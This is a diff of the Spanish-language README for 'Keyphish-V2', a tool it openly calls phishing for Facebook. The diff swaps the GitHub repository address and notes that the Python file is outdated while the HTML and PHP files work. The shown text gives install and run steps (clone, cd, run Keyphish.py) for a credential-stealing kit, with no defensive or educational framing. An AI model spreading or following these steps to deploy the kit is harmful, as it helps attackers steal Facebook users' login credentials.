@@ -1,12 +1,11 @@
-### El codigo del archivo python esta desactualizado
+### El codigo del archivo python esta desactualizado el .HTML y .php están correctos.
 
 # Keyphish-V2
 Phishing para Facebook 
 
 Ubuntu, Kali linux, Debian
 
-- git clone https://github.com/Mr-Star21/Keyphish-V2.git
-
+- git clone https://github.com/BR4CKSTAR/Keyphish-V2
 - cd Keyphish-V2
 
 - python Keyphish.py
